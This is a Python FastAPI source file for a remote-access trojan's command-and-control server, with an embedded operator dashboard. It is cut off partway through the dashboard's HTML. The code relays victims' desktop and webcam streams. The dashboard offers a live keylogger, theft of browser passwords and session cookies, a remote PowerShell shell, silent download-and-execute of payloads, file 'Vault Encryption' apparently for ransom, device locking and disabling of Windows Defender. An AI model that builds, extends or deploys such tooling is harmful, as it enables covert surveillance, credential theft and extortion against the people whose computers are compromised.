import os
import sys
import time
import json
import asyncio
import logging
import base64
import subprocess
import shutil
import struct
import uuid
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from collections import deque
from fastapi.responses import HTMLResponse, PlainTextResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s  %(message)s")
logger = logging.getLogger("c2")

HTTP_PORT = int(os.environ.get("PORT", os.environ.get("SERVER_PORT", "80")))
STREAM_PORT = 1000

_udp_frag_buf = {}  # device_id -> {seq: {frags: {}, total: int, ts: float}}
_UDP_FRAG_TIMEOUT = 10.0

logger.setLevel(logging.INFO)
log_file = os.path.join(os.getcwd(), "server.log")
file_handler = logging.FileHandler(log_file, encoding="utf-8")
file_handler.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s %(message)s"))
logger.addHandler(file_handler)

CMD_REG = 0x4B
CMD_VIEW = 0x15


def _ws_payload(msg: dict):
    """
    Normalize Starlette websocket.receive() dict.
    Returns ('bytes', data), ('text', data), or None when the client disconnected.
    Must stop calling receive() after None — otherwise Starlette raises RuntimeError.
    """
    t = msg.get("type", "")
    if t == "websocket.disconnect":
        return None
    if t != "websocket.receive":
        return ("skip", None)
    if msg.get("bytes") is not None:
        return ("bytes", msg["bytes"])
    if msg.get("text") is not None:
        return ("text", msg["text"])
    return ("skip", None)


class UDPStreamProtocol(asyncio.DatagramProtocol):
    """Receives stream frames from agents via UDP and relays to browser viewers."""

    def datagram_received(self, data: bytes, addr):
        try:
            if len(data) < 43:
                return
            device_id = data[:36].decode("ascii", errors="replace")
            seq = struct.unpack("<I", data[36:40])[0]
            frame_type = data[40]
            frag_total = data[41]
            frag_idx = data[42]
            payload = data[43:]
            if frag_total < 1 or frag_idx >= frag_total:
                return

            if frag_total > 1:
                key = (device_id, seq)
                now = time.time()
                if key not in _udp_frag_buf:
                    _udp_frag_buf[key] = {"frags": {}, "total": frag_total, "ts": now}
                entry = _udp_frag_buf[key]
                entry["frags"][frag_idx] = payload
                if len(entry["frags"]) >= entry["total"]:
                    assembled = b"".join(entry["frags"][i] for i in range(entry["total"]))
                    del _udp_frag_buf[key]
                    asyncio.ensure_future(self._relay_frame(device_id, frame_type, assembled))
            else:
                asyncio.ensure_future(self._relay_frame(device_id, frame_type, payload))

            now = time.time()
            stale_keys = [k for k, v in _udp_frag_buf.items() if now - v["ts"] > _UDP_FRAG_TIMEOUT]
            for k in stale_keys:
                del _udp_frag_buf[k]
        except Exception:
            pass

    async def _relay_frame(self, device_id: str, frame_type: int, payload: bytes):
        session = await state.get_client(device_id)
        if not session:
            return
        session.last_seen = time.time()
        blob = bytes([frame_type]) + payload
        if frame_type == 0x02:
            await session.broadcast_cam_bytes(blob)
        else:
            await session.broadcast_bytes(blob)


async def _cleanup_udp_frags():
    while True:
        await asyncio.sleep(15)
        now = time.time()
        stale = [k for k, v in _udp_frag_buf.items() if now - v["ts"] > _UDP_FRAG_TIMEOUT]
        for k in stale:
            del _udp_frag_buf[k]


async def lifespan(app: FastAPI):
    os.makedirs("downloads", exist_ok=True)
    cleanup_task = asyncio.create_task(_cleanup_loop())
    frag_task = asyncio.create_task(_cleanup_udp_frags())

    udp_transport = None
    try:
        loop = asyncio.get_event_loop()
        udp_transport, _ = await loop.create_datagram_endpoint(
            UDPStreamProtocol, local_addr=("0.0.0.0", STREAM_PORT)
        )
        logger.info(f"🚀 UDP stream listener on port {STREAM_PORT}")
    except Exception as ex:
        logger.warning(f"UDP listener on {STREAM_PORT} failed: {ex}")

    yield
    if udp_transport:
        udp_transport.close()
    frag_task.cancel()
    try:
        await frag_task
    except asyncio.CancelledError:
        pass
    cleanup_task.cancel()
    try:
        await cleanup_task
    except asyncio.CancelledError:
        pass


async def _cleanup_loop():
    """Every 30s, remove stale clients and log stats."""
    while True:
        await asyncio.sleep(30)
        try:
            stale = await state.cleanup_stale()
            active = len(state.clients)
            total_viewers = sum(len(s.viewers) + len(s.cam_viewers) for s in state.clients.values())
            if stale or active:
                logger.info(f"📊 Stats: {active} active clients, {total_viewers} viewers, {stale} cleaned")
        except Exception as ex:
            logger.warning(f"Cleanup error: {ex}")

app = FastAPI(lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])


class ClientSession:
    def __init__(self, ws: WebSocket, info: dict):
        self.ws = ws
        self.info = info
        self.viewers = set()
        self.cam_viewers = set()
        self.camera_ws = None
        self.udp_addr = None
        self.last_seen = time.time()
        self.created = time.time()
        self._agent_send_lock = asyncio.Lock()
        self._broadcast_tasks = set()

    async def agent_send_bytes(self, data: bytes):
        async with self._agent_send_lock:
            await self.ws.send_bytes(data)

    async def agent_send_text(self, text: str):
        async with self._agent_send_lock:
            await self.ws.send_text(text)

    async def broadcast_bytes(self, payload: bytes):
        """Fan-out bytes to all viewers concurrently."""
        tasks = []
        for v in list(self.viewers):
            tasks.append(self._send_to_viewer_bytes(v, payload))
        if tasks:
            self._broadcast_tasks.update(tasks)
            await asyncio.gather(*tasks, return_exceptions=True)
            self._broadcast_tasks.difference_update(tasks)

    async def _send_to_viewer_bytes(self, v, payload: bytes):
        try:
            await v.send_bytes(payload)
        except Exception:
            self.viewers.discard(v)

    async def broadcast_text(self, data: dict):
        """Fan-out text to all viewers concurrently."""
        tasks = []
        for v in list(self.viewers):
            tasks.append(self._send_to_viewer_text(v, data))
        if tasks:
            self._broadcast_tasks.update(tasks)
            await asyncio.gather(*tasks, return_exceptions=True)
            self._broadcast_tasks.difference_update(tasks)

    async def _send_to_viewer_text(self, v, data: dict):
        try:
            await v.send_json(data)
        except Exception:
            self.viewers.discard(v)

    async def broadcast_cam_bytes(self, payload: bytes):
        """Fan-out camera bytes to cam_viewers concurrently."""
        tasks = []
        for v in list(self.cam_viewers):
            tasks.append(self._send_to_cam_viewer(v, payload))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def _send_to_cam_viewer(self, v, payload: bytes):
        try:
            await v.send_bytes(payload)
        except Exception:
            self.cam_viewers.discard(v)

    @property
    def is_alive(self):
        return time.time() - self.last_seen < 120


class ServerState:
    def __init__(self):
        self.clients = {}
        self._lock = asyncio.Lock()

    async def get_client(self, device_id: str):
        return self.clients.get(device_id)

    async def set_client(self, device_id: str, session: ClientSession):
        async with self._lock:
            self.clients[device_id] = session

    async def remove_client(self, device_id: str):
        async with self._lock:
            self.clients.pop(device_id, None)

    async def cleanup_stale(self):
        """Remove clients that haven't sent data in 120s."""
        now = time.time()
        stale = [cid for cid, s in list(self.clients.items()) if now - s.last_seen > 120]
        for cid in stale:
            logger.info(f"🧹 Cleaning stale client: {cid[:8]}...")
            await self.remove_client(cid)
        return len(stale)


state = ServerState()
known_clients = {}  # device_id -> {hostname, os, status, first_seen, last_seen}

# ─── Dashboard HTML ───────────────────────────────────────────
DASHBOARD = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<title>NEXUS · Remote Ops Console</title>
<style>
:root{
  --gold:#f5d742;--cyan:#00f5ff;--magenta:#ff2ea6;--violet:#9d7bff;
  --bg:#05050a;--panel:rgba(12,14,28,.92);--card:#14182a;--border:rgba(0,245,255,.18);
  --green:#3dff9d;--red:#ff4d7d;--blue:#4db8ff;--text:#e8f0ff;--muted:#7a8aa8;
  --glass:linear-gradient(145deg,rgba(20,28,48,.95),rgba(8,10,20,.88));
  --ps-w:360px;
  --term-fs:12px;
  --term-fs-pop:11px;
}
*{box-sizing:border-box;margin:0;padding:0}
body{
  font-family:'Segoe UI',system-ui,sans-serif;
  background:var(--bg);color:var(--text);
  display:flex;flex-direction:column;height:100vh;overflow:hidden;
  position:relative;
}
body::before{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
  background:
    radial-gradient(ellipse 120% 80% at 10% -20%,rgba(0,245,255,.12),transparent 50%),
    radial-gradient(ellipse 80% 60% at 100% 0%,rgba(255,46,166,.1),transparent 45%),
    repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,245,255,.03) 2px,rgba(0,245,255,.03) 3px);
}
body::after{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;opacity:.04;
  background:repeating-linear-gradient(transparent,transparent 1px,rgba(0,0,0,.35) 1px,rgba(0,0,0,.35) 2px);
  animation:scan 14s linear infinite;
}
@keyframes scan{to{transform:translateY(20px)}}
#topnav,#wrap{position:relative;z-index:1}

/* ─── TOP NAV BAR ─────────────────────────────────────── */
#topnav{
  height:54px;background:var(--glass);backdrop-filter:blur(12px);
  border-bottom:1px solid var(--border);box-shadow:0 4px 24px rgba(0,0,0,.45);
  display:flex;align-items:center;padding:0 14px;gap:8px;z-index:100;
}
#topnav .logo{
  font-family:'Consolas','Segoe UI',sans-serif;font-size:12px;font-weight:800;letter-spacing:4px;
  background:linear-gradient(90deg,var(--cyan),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent;
  margin-right:14px;white-space:nowrap;text-shadow:0 0 40px rgba(0,245,255,.3);
}
#node_tag{
  color:var(--cyan);font-weight:700;font-size:12px;margin-right:16px;padding:5px 14px;
  background:rgba(0,245,255,.08);border:1px solid rgba(0,245,255,.35);border-radius:999px;display:none;
  font-family:'Consolas','Courier New',monospace;box-shadow:0 0 20px rgba(0,245,255,.15);
}

/* Combo Dropdown */
.combo{position:relative;display:inline-flex}
.combo-btn{
  background:rgba(20,24,42,.9);color:#c5d4f0;border:1px solid var(--border);padding:8px 14px;border-radius:8px;cursor:pointer;
  font-size:11px;font-weight:600;font-family:inherit;display:flex;align-items:center;gap:6px;transition:.18s;white-space:nowrap;
}
.combo-btn:hover{border-color:var(--cyan);color:#fff;box-shadow:0 0 16px rgba(0,245,255,.12)}
.combo-btn .icon{font-size:14px}
.combo-btn::after{content:'▾';margin-left:4px;font-size:10px;color:#555}
.combo-panel{display:none;position:absolute;top:calc(100% + 6px);left:0;min-width:228px;background:rgba(16,18,36,.98);border:1px solid var(--border);border-radius:10px;box-shadow:0 20px 60px rgba(0,0,0,.75),0 0 1px var(--cyan);z-index:200;overflow:hidden;animation:fadeIn .15s ease}
.combo-panel.show{display:block}
.combo-panel a{display:flex;align-items:center;gap:10px;padding:11px 16px;color:#bbb;font-size:12px;font-weight:500;cursor:pointer;transition:.12s;border-bottom:1px solid #1a1a2e}
.combo-panel a:last-child{border:0}
.combo-panel a:hover{background:#1e1e38;color:var(--gold)}
.combo-panel a .ci{width:20px;text-align:center;font-size:14px}
.combo-panel a.danger{color:var(--red)}
.combo-panel a.danger:hover{color:#ff6b8a;background:#1e1020}

/* View toggle pills */
.view-pills{display:flex;gap:0;margin-left:auto;margin-right:8px}
.pill{padding:6px 16px;font-size:11px;font-weight:700;cursor:pointer;border:1px solid var(--border);color:#888;transition:.2s;text-transform:uppercase;letter-spacing:.5px}
.pill:first-child{border-radius:6px 0 0 6px}
.pill:last-child{border-radius:0 6px 6px 0;border-left:0}
.pill.on{background:linear-gradient(135deg,var(--cyan),#00c8d4);color:#020208;border-color:transparent;font-weight:800}
.pill:hover:not(.on){background:rgba(0,245,255,.08);color:var(--cyan);border-color:rgba(0,245,255,.35)}

@keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}

/* ─── LAYOUT ──────────────────────────────────────────── */
#wrap{flex:1;display:flex;overflow:hidden}

#sidebar{width:268px;background:var(--glass);backdrop-filter:blur(10px);border-right:1px solid var(--border);display:flex;flex-direction:column;box-shadow:4px 0 32px rgba(0,0,0,.25)}
#sidebar h2{padding:14px 16px;  font-family:'Consolas','Segoe UI',sans-serif;font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:4px;color:var(--cyan);border-bottom:1px solid var(--border)}
#clist{flex:1;overflow-y:auto;padding:8px}

.nd{padding:12px 14px;background:rgba(20,24,42,.75);margin-bottom:8px;border-radius:10px;cursor:pointer;border:1px solid rgba(0,245,255,.12);transition:.2s;position:relative;overflow:hidden}
.nd:hover{border-color:rgba(0,245,255,.4);box-shadow:0 0 20px rgba(0,245,255,.08)}
.nd.act{border-color:var(--cyan);background:rgba(0,245,255,.06);box-shadow:0 0 24px rgba(0,245,255,.12)}
.nd.offline{border-color:rgba(120,120,140,.15);opacity:.55}
.nd.offline::before{background:linear-gradient(180deg,#555,#333)}
.nd.offline:hover{opacity:.8;border-color:rgba(120,120,140,.3)}
.nd::before{content:'';position:absolute;left:0;top:0;height:100%;width:3px;background:linear-gradient(180deg,var(--cyan),var(--magenta));border-radius:3px 0 0 3px}
.nd b{color:#fff;font-size:12px;font-weight:700;font-family:'Consolas','Courier New',monospace}
.nd .os{color:var(--muted);font-size:10px;margin-top:4px;display:block}
.bg{font-size:8px;font-weight:800;padding:3px 10px;border-radius:20px;background:rgba(61,255,157,.12);color:var(--green);margin-top:6px;display:inline-block;letter-spacing:.6px;text-transform:uppercase;border:1px solid rgba(61,255,157,.25)}
.bg.offline-badge{background:rgba(120,120,140,.1);color:#888;border-color:rgba(120,120,140,.2)}
.last-seen{display:block;font-size:9px;color:#666;margin-top:2px}
.es{padding:30px;color:var(--muted);font-size:12px;text-align:center;font-weight:600;letter-spacing:1px}

#stage{flex:1;display:flex;overflow:hidden;min-height:0}
#cvw{flex:1;min-width:100px;background:#020208;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;position:relative;border-right:1px solid rgba(0,245,255,.1)}
#vlbl{position:absolute;top:12px;left:12px;font-size:10px;font-weight:800;padding:6px 12px;border-radius:6px;background:rgba(0,8,16,.85);color:var(--cyan);text-transform:uppercase;letter-spacing:2px;z-index:5;font-family:'Consolas','Segoe UI',sans-serif;border:1px solid rgba(0,245,255,.25)}
canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12px rgba(0,245,255,.06))}

#rp{
  flex:0 0 var(--ps-w);width:var(--ps-w);min-width:220px;max-width:min(78vw,920px);
  background:linear-gradient(180deg,#060b14 0%,#0a1020 100%);
  border-left:1px solid rgba(0,245,255,.22);display:flex;flex-direction:column;min-height:0;
  box-shadow:-8px 0 40px rgba(0,0,0,.4);
}
.th{
  flex-shrink:0;padding:8px 10px;background:rgba(0,40,56,.5);font-size:10px;font-weight:800;border-bottom:1px solid rgba(0,245,255,.2);
  color:var(--cyan);display:flex;align-items:center;gap:8px;justify-content:space-between;font-family:'Consolas','Segoe UI',sans-serif;letter-spacing:1px;
}
.th .th-left{display:flex;align-items:center;gap:8px}
.th .dot{width:8px;height:8px;border-radius:50%;background:var(--cyan);box-shadow:0 0 10px var(--cyan);animation:pulse 2s ease infinite}
@keyframes pulse{50%{opacity:.5;transform:scale(.9)}}
.ps-tools{display:flex;align-items:center;gap:4px}
.ps-rbtn{
  width:28px;height:26px;border-radius:6px;border:1px solid rgba(0,245,255,.35);background:rgba(0,20,30,.8);
  color:var(--cyan);font-size:16px;font-weight:700;cursor:pointer;line-height:1;padding:0;font-family:'Consolas','Courier New',monospace;
  transition:.15s;
}
.ps-rbtn:hover{background:rgba(0,245,255,.15);color:#fff}
#term{
  flex:1;min-height:120px;padding:12px;background:#040a12;
  font-family:'Consolas','Courier New',monospace;
  font-size:var(--term-fs);
  overflow-y:auto;color:#b8e8ff;line-height:1.55;white-space:pre-wrap;word-break:break-all;border-left:2px solid rgba(0,245,255,.15);
}
#term .run-dot{color:var(--green);animation:pulse 1s ease infinite;display:inline-block}
#termPop .run-dot{color:var(--violet);animation:pulse 1s ease infinite;display:inline-block}
.ti{background:rgba(0,28,42,.9);border-top:1px solid rgba(0,245,255,.2);padding:8px 10px;display:flex;align-items:center;gap:6px}
.ti span{color:var(--green);font-family:'Consolas','Courier New',monospace;font-weight:700;font-size:11px;flex-shrink:0}
.ti input{background:rgba(0,0,0,.35);border:1px solid rgba(0,245,255,.2);border-radius:6px;color:#f0ffff;flex:1;outline:0;font-family:'Consolas','Courier New',monospace;font-size:11px;padding:8px 10px}
.ti input:focus{border-color:var(--cyan);box-shadow:0 0 12px rgba(0,245,255,.12)}

/* Modals */
.ov{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(2,4,12,.72);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:500;padding:16px}
.ov.open{display:flex}
.mb{width:92%;max-width:920px;max-height:86vh;background:linear-gradient(165deg,rgba(18,22,40,.98),rgba(8,10,22,.98));border:1px solid rgba(0,245,255,.25);border-radius:14px;display:flex;flex-direction:column;box-shadow:0 24px 100px rgba(0,0,0,.85),0 0 60px rgba(0,245,255,.06);overflow:hidden}
.mb-term{max-width:720px}
#termm .mb.mb-term{display:flex;flex-direction:column;height:min(70vh,580px);max-height:86vh;min-height:280px}
#termm .mb.mb-term #termPop{flex:1;min-height:0}
.mh{padding:12px 16px;background:rgba(0,30,48,.6);display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(0,245,255,.2);gap:10px;flex-wrap:wrap}
.mh span{font-weight:800;font-size:13px;font-family:'Consolas','Segoe UI',sans-serif;color:var(--cyan);letter-spacing:.5px}
.mh .mh-actions{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
.mh button{background:rgba(0,245,255,.12);border:1px solid rgba(0,245,255,.35);color:var(--cyan);padding:6px 12px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;transition:.15s;font-family:inherit}
.mh button:hover{background:rgba(0,245,255,.22);color:#fff}
.mc{flex:1;overflow-y:auto;padding:16px;min-height:0}
.brc{padding:10px 14px;background:rgba(0,8,20,.9);border-bottom:1px solid rgba(0,245,255,.15);font-size:11px;font-family:'Consolas','Courier New',monospace;color:var(--cyan);word-break:break-all}

.fi{padding:10px 12px;border-bottom:1px solid rgba(0,245,255,.08);display:flex;align-items:center;transition:.12s;gap:8px;flex-wrap:wrap}
.fi:hover{background:rgba(0,245,255,.04)}
.fn{flex:1;min-width:120px;cursor:pointer;font-size:12px;font-weight:500}
.fn:hover{color:var(--cyan)}
.fs{color:var(--muted);font-size:10px;width:72px;text-align:right;flex-shrink:0}
.fi-actions{display:flex;flex-wrap:wrap;gap:6px;align-items:center}
.bsm-term{border-color:rgba(157,123,255,.5)!important;color:#dcc6ff!important}
.bsm-term:hover{border-color:var(--violet)!important;color:#fff!important}

#termPop{flex:1;min-height:160px;padding:12px;background:#030810;font-family:'Consolas','Courier New',monospace;font-size:var(--term-fs-pop);overflow-y:auto;color:#c5f0ff;line-height:1.55;white-space:pre-wrap;border-top:1px solid rgba(0,245,255,.12)}
.ti-pop{background:rgba(0,24,36,.95);border-top:1px solid rgba(157,123,255,.25);padding:8px 10px;display:flex;align-items:center;gap:8px}
.ti-pop span{color:var(--violet);font-family:'Consolas','Courier New',monospace;font-weight:700;font-size:11px}
.ti-pop input{flex:1;background:rgba(0,0,0,.4);border:1px solid rgba(157,123,255,.3);border-radius:6px;color:#fff;padding:8px 10px;font-family:'Consolas','Courier New',monospace;font-size:11px;outline:0}
.term-path{font-size:10px;color:var(--muted);font-family:'Consolas','Courier New',monospace;max-width:100%;overflow:hidden;text-overflow:ellipsis}

.btn{
  background:linear-gradient(135deg,var(--cyan),#00a8c6);border:0;color:#02040a;padding:9px 18px;border-radius:8px;cursor:pointer;font-weight:800;font-size:11px;
  text-transform:uppercase;letter-spacing:.6px;font-family:'Consolas','Segoe UI',sans-serif;transition:.18s;box-shadow:0 4px 20px rgba(0,245,255,.25);
}
.btn:hover{filter:brightness(1.08);transform:translateY(-1px);box-shadow:0 6px 28px rgba(0,245,255,.35)}
.bsm{background:rgba(20,26,48,.9);border:1px solid rgba(0,245,255,.2);color:#c8deff;padding:5px 10px;border-radius:6px;cursor:pointer;font-size:10px;font-family:inherit;transition:.15s;font-weight:600}
.bsm:hover{border-color:var(--cyan);color:var(--cyan)}
.br{background:linear-gradient(135deg,#ff4d7d,#c21a4a);color:#fff;border:0}
.bng{background:linear-gradient(135deg,var(--green),#00c978);color:#020808;border:0}
input[type=text]{background:rgba(0,12,24,.6);border:1px solid rgba(0,245,255,.2);color:#fff;padding:10px 14px;border-radius:8px;width:100%;margin:8px 0;font-size:13px;font-family:inherit}
input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2px rgba(0,245,255,.12)}
.status-panel{padding:10px 12px;margin:8px;border-radius:10px;background:rgba(0,40,32,.35);border:1px solid rgba(61,255,157,.2);color:#9effd0;font-size:12px;font-family:'Consolas','Courier New',monospace}
.log-panel{margin:8px;border:1px solid rgba(0,245,255,.15);border-radius:10px;background:rgba(4,8,16,.9);overflow:hidden;flex-shrink:0}
.log-panel .log-header{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:rgba(0,24,36,.6);color:var(--cyan);font-size:11px;font-family:'Consolas','Segoe UI',sans-serif;font-weight:700}
.log-panel pre{margin:0;padding:12px;font-family:'Consolas','Courier New',monospace;font-size:10px;line-height:1.45;color:#a8e8ff;background:#02060c;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word}
@media (max-width:900px){
  #sidebar{width:220px}
  #rp{min-width:200px}
}
@media (max-width:720px){
  #wrap{flex-direction:column}
  #sidebar{width:100%!important;max-height:38vh;border-right:0;border-bottom:1px solid var(--border)}
  #stage{flex-direction:column;flex:1;min-height:0}
  #cvw{min-height:40vh;border-right:0}
  #rp{flex:1 1 auto!important;width:100%!important;max-width:none!important;border-left:0;border-top:1px solid rgba(0,245,255,.2);min-height:220px}
}
</style>
</head>
<body>

<!-- TOP NAV -->
<div id="topnav">
    <div class="logo">NEXUS</div>
    <span id="node_tag"></span>

    <div class="combo">
        <button class="combo-btn"><span class="icon">📡</span> Surveillance</button>
        <div class="combo-panel">
            <a onclick="sw('screen')"><span class="ci">🖥️</span> Desktop Stream</a>
            <a onclick="sw('cam')"><span class="ci">📹</span> Webcam Stream</a>
            <a onclick="openM('klm')"><span class="ci">⌨️</span> Live Keylogger</a>
        </div>
    </div>

    <div class="combo">
        <button class="combo-btn"><span class="icon">🔑</span> Credentials</button>
        <div class="combo-panel">
            <a onclick="sc(0x30)"><span class="ci">🔓</span> Browser Passwords</a>
            <a onclick="sc(0x32)"><span class="ci">🍪</span> Session Cookies</a>
        </div>
    </div>

    <div class="combo">
        <button class="combo-btn"><span class="icon">📁</span> System</button>
        <div class="combo-panel">
            <a onclick="openExp()"><span class="ci">📂</span> File Explorer</a>
            <a onclick="openM('urlm')"><span class="ci">🌐</span> URL Injector</a>
            <a onclick="openM('dlm')"><span class="ci">📥</span> Silent Downloader</a>
            <a onclick="openM('sndm')"><span class="ci">🎵</span> Inject Sound</a>
            <a onclick="doLock()"><span class="ci">🔒</span> Lock Device</a>
            <a onclick="doEnc()" class="danger"><span class="ci">🔐</span> Vault Encryption</a>
            <a onclick="doDec()" style="color:#00e676;"><span class="ci">🔓</span> Vault Decryption</a>
            <a onclick="openM('runm')"><span class="ci">▶️</span> Run Program</a>
            <a onclick="doDisableDefender()" class="danger"><span class="ci">🛡️</span> Kill Windows Defender</a>
        </div>
    </div>

    <div class="view-pills">
        <button id="recBtn" onclick="toggleRec()" style="display:none;margin-right:10px;background:#ff4d6a;color:#fff;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:11px">🔴 RECORD</button>
        <div class="pill on" id="ps" onclick="sw('screen')">🖥 Desktop</div>
        <div class="pill" id="pc" onclick="sw('cam')">📹 Webcam</div>
        <div class="pill" id="popen" onclick="openCamTab()">🌐 Webcam Tab</div>
        <div class="pill" id="pa" onclick="toggleAudio()">🔊 Audio</div>
        <div class="pill" id="pmic" onclick="toggleMic()">🎙 Mic</div>
    </div>
</div>

<!-- BODY -->
<div id="wrap">

<div id="sidebar">
    <h2>◆ NODE MESH</h2>
    <div id="clist"><div class="es">AWAITING NODES...</div></div>
    <div class="status-panel" id="statusBar">Status: awaiting nodes...</div>
    <div id="disconnectBar" style="display:none;padding:4px 12px 8px">
        <button onclick="doDisconnect()" style="width:100%;background:rgba(255,77,125,.15);color:#ff4d7d;border:1px solid rgba(255,77,125,.3);border-radius:6px;padding:6px;cursor:pointer;font-size:10px;font-weight:700;font-family:inherit">✕ Disconnect from current node</button>
    </div>
    <div class="log-panel">
        <div class="log-header"><span>Server Logs</span><button class="bsm" onclick="loadLogs()">Refresh</button></div>
        <pre id="logArea">Loading logs...</pre>
    </div>
</div>

<div id="stage">
    <div id="cvw">
        <div id="vlbl">🖥 Desktop</div>
        <canvas id="cv" tabindex="0"></canvas>
        <audio id="audioPlayer" autoplay controls style="width:100%;margin-top:10px;display:none"></audio>
    </div>
    <div id="rp">
        <div class="th">
            <div class="th-left"><div class="dot"></div> REMOTE SHELL</div>
            <div class="ps-tools" title="Panel width">
                <button type="button" class="ps-rbtn" onclick="termFs(-1)" title="Smaller text">A−</button>
                <button type="button" class="ps-rbtn" onclick="termFs(1)" title="Larger text">A+</button>
                <button type="button" class="ps-rbtn" onclick="termScrollLock()" id="slBtn" title="Auto-scroll toggle">⤓</button>
                <button type="button" class="ps-rbtn" onclick="resizePs(-48)" title="Narrower">−</button>
                <button type="button" class="ps-rbtn" onclick="resizePs(48)" title="Wider">+</button>
                <button type="button" class="ps-rbtn" onclick="resizePs(0)" title="Reset width">↺</button>
            </div>
        </div>
        <div id="term">Awaiting connection...\\n</div>
        <div class="ti"><span>PS&gt;</span><input id="sh" onkeydown="if(event.key==='Enter')doSh()" placeholder="PowerShell command..." autocomplete="off" spellcheck="false"></div>
    </div>
</div>

</div>

<!-- MODALS -->
<div id="fem" class="ov" onclick="if(event.target===this)closeM('fem')">
    <div class="mb">
        <div class="mh">
            <span>📂 Remote Explorer</span>
            <div class="mh-actions">
                <button type="button" class="bsm" onclick="nav('DRIVES')">🖥️ Drives</button>
                <button type="button" class="bsm bsm-term" onclick="openTermHereFromExplorer()">💻 PS here</button>
                <button type="button" onclick="closeM('fem')">✕ Close</button>
            </div>
        </div>
        <div class="brc" id="bc">/</div>
        <div class="mc" id="fl"></div>
    </div>
</div>

<div id="termm" class="ov" onclick="if(event.target===this)closeM('termm')">
    <div class="mb mb-term" onclick="event.stopPropagation()">
        <div class="mh">
            <span>⚡ Folder PowerShell</span>
            <button type="button" onclick="closeM('termm')">✕ Close</button>
        </div>
        <div class="brc"><span class="term-path" id="termPathLabel" title="Working directory on target"></span></div>
        <div id="termPop">Ready. Commands run on the remote host in the folder shown above.
</div>
        <div class="ti-pop">
            <span>PS&gt;</span>
            <input id="shPop" onkeydown="if(event.key==='Enter')doShPop()" placeholder="Command in this folder..." autocomplete="off" spellcheck="false">
        </div>
    </div>
</div>

<div id="urlm" class="ov" onclick="if(event.target===this)closeM('urlm')">
    <div class="mb" style="max-width:500px">
        <div class="mh"><span>🌐 URL Injector</span><button onclick="closeM('urlm')">✕ Close</button></div>
        <div class="mc">
            <p style="color:var(--muted);margin-bottom:12px;font-size:13px">Open a URL in the target's default browser:</p>
            <input type="text" id="ui" placeholder="https://example.com">
            <button class="btn" onclick="doUrl()" style="margin-top:12px;width:100%">🚀 Launch in Browser</button>
        </div>
    </div>
</div>

<div id="dlm" class="ov" onclick="if(event.target===this)closeM('dlm')">
    <div class="mb" style="max-width:500px">
        <div class="mh"><span>📥 Silent Downloader</span><button onclick="closeM('dlm')">✕ Close</button></div>
        <div class="mc">
            <p style="color:var(--muted);margin-bottom:12px;font-size:13px">Download and execute a file silently on target:</p>
            <input type="text" id="di" placeholder="https://example.com/payload.exe">
            <button class="btn" onclick="doDl()" style="margin-top:12px;width:100%">⚡ Download & Execute</button>
        </div>
    </div>
</div>

<div id="runm" class="ov" onclick="if(event.target===this)closeM('runm')">
    <div class="mb" style="max-width:550px">
        <div class="mh"><span>▶️ Run Program / Payload</span><button onclick="closeM('runm')">✕ Close</button></div>
        <div class="mc">
            <p style="color:var(--muted);margin-bottom:12px;font-size:13px">Download and execute a remote payload, or run a local file:</p>
            <input type="text" id="runUrl" placeholder="https://example.com/payload.exe" style="margin-bottom:4px">
            <input type="text" id="runArgs" placeholder="Arguments (optional)" style="margin-bottom:4px">
            <label style="display:flex;align-items:center;gap:8px;color:var(--muted);font-size:12px;margin:8px 0;cursor:pointer">
                <input type="checkbox" id="runTerminal" checked> Show output in terminal
            </label>
            <div style="display:flex;gap:8px">
                <button class="btn" onclick="doDlEx()" style="flex:1">⬇ Download & Run from URL</button>
            </div>
            <hr style="border-color:var(--border);margin:16px 0">
            <p style="color:var(--muted);font-size:12px;margin-bottom:8px">Or run a file already on the target:</p>
            <input type="text" id="runLocalPath" placeholder="C:/path/to/file.exe" style="margin-bottom:4px">
            <button class="btn" onclick="doRunLocalExe()" style="width:100%">▶ Run Local File</button>
        </div>
    </div>
</div>

<div id="sndm" class="ov" onclick="if(event.target===this)closeM('sndm')">
    <div class="mb" style="max-width:500px">
        <div class="mh"><span>🎵 Inject Sound</span><button onclick="closeM('sndm')">✕ Close</button></div>
        <div class="mc">
            <p style="color:var(--muted);margin-bottom:12px;font-size:13px">Send an audio file to the selected client for local playback:</p>
            <input type="file" id="sndFile" accept="audio/*">
            <button class="btn" onclick="sendSoundFile()" style="margin-top:12px;width:100%">Send Audio to Client</button>
        </div>
    </div>
</div>

<div id="klm" class="ov" onclick="if(event.target===this)closeM('klm')">
    <div class="mb" style="max-width:700px">
        <div class="mh"><span>⌨️ Live Keylogger</span><button onclick="closeM('klm')">✕ Close</button></div>
        <div class="mc">
            <div style="display:flex;gap:8px;margin-bottom:16px">
                <button class="btn bng" onclick="lc('start')">▶ Start Recording</button>
                <button class="btn br" onclick="lc('stop')">⏹ Stop</button>
